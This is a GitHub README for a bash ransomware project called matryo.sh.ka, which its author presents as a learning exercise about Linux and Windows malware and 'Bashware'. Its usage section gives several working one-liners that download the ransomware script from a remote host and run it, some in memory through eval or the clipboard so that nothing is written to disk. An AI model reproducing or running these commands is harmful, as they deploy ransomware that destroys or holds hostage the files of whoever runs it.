# matryo.sh.ka
matryo.sh.ka is "ransomware" implemented in bash.  
It is the sister of [kukolny](https://github.com/wilsonfisk/kukolny)

## Why?:
  * Broaden my knowledge and understanding of Computer Science.
  * Explore the various tools and techniques employed by both Linux and Windows malware, including:
    * Obfuscation techniques in various languages
	* Exfiltration of data
	* Evasion and hiding malicious activity
  * Improving proficiency with bash, Linux, and Windows
  * Explore the new "Bashware" malware threat
  * Boredom

## Utilizing matryo.sh.ka:
  * **From Memory:**
    * **Method 1:**  M=$(curl -fsSL "https://raw.githubusercontent.com/wilsonfisk/matryoshka/master/matryoshka.sh") ; eval "$M"
	* **Method 2:**  curl -fsSL "https://raw.githubusercontent.com/wilsonfisk/matryoshka/master/matryoshka.sh" | xclip -selection clipboard;M="xclip -o -selection clipboard"&&eval "$M"
	* xclip can be replaced with pbcopy and pbpaste for OS X hosts.
	* xsel --clipboard  is another option
  * **From Disk:**
    * curl -OfsSL "https://raw.githubusercontent.com/wilsonfisk/matryoshka/master/matryoshka.sh" ; . matryoshka.sh

**Bashware references:**  
[Beware of the Bashware: A New Method for Any Malware to Bypass Security Solutions](https://blog.checkpoint.com/2017/09/11/beware-bashware-new-method-malware-bypass-security-solutions)

[Check Point Software Technologies, Ltd. Demonstration of the Bashware Technique](https://www.youtube.com/watch?v=fwEQFMbHIV8)

[Bish, bosh, Bashware: Microsoft downplays research on WSL Win 10 'hack' threat](https://www.theregister.co.uk/2017/09/12/microsoft_downplays_bashware_malware_threat/)
